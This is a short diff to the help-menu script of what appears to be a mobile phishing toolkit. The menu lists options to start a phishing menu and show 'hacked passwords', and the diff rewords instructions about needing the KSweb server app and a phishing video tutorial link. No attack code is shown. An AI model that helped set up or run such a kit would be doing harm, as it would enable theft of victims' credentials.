@@ -6,8 +6,9 @@ echo "sh help  - OPENS THIS MENU"
 echo "sh start - STARTS THE PHISHING MENU"
 echo "sh show  - SHOW HACKED PASSWORDS"
 echo ""
-echo To Start server KSweb App is need
-echo To Video Tutorial visit below link
+echo KSweb App is need is need to start server
+echo Make sure you installed KSweb App
+echo For Video Tutorial visit below link
 echo ""
 echo "www.philiphacker.in/p/tut/phishing"
 echo ""
